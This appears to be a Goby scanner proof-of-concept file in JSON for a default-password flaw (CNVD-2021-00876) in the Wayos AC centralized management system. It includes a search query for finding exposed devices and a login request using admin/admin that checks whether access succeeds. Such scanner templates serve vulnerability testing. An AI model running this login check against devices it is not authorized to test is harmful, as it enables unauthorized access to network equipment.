{
    "Name": "Wayos AC Centralized management system Default weak password (CNVD-2021-00876)",
    "Level": "2",
    "Tags": [
        "Default weak password"
    ],
    "GobyQuery": "(title=\"AC集中管理平台\" && body=\"login_25.jpg\") || (body=\"login.cgi\" && body=\"login_25.jpg\")",
    "Description": "Shenzhen Weimeng Technology Co., Ltd. is a leading network equipment and smart home product solution provider in China. Its main products include wireless gateway, switch, foreign VPN, dual band top-down AP, etc.\n\n\n\nWeak password vulnerability exists in AC centralized management platform, which can be used by attackers to obtain sensitive information.",
    "Product": "Wayos AC Centralized management system",
    "Homepage": "http://www.wayos.com/",
    "Author": "PeiQi",
    "Impact": "<p>An attacker can use this vulnerability to obtain sensitive information.</p>",
    "Recommendation": "",
    "References": [
        "http://wiki.peiqi.tech"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/login.cgi",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "user=admin&password=admin"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "not contains",
                        "value": "flag=0",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastheader|variable|{{{scheme}}}://admin:admin@{{{hostinfo}}}/login.cgi"
            ]
        }
    ],
    "PostTime": "2021-04-04 22:08:56",
    "GobyVersion": "1.8.255",
    "PocId": "10176"
}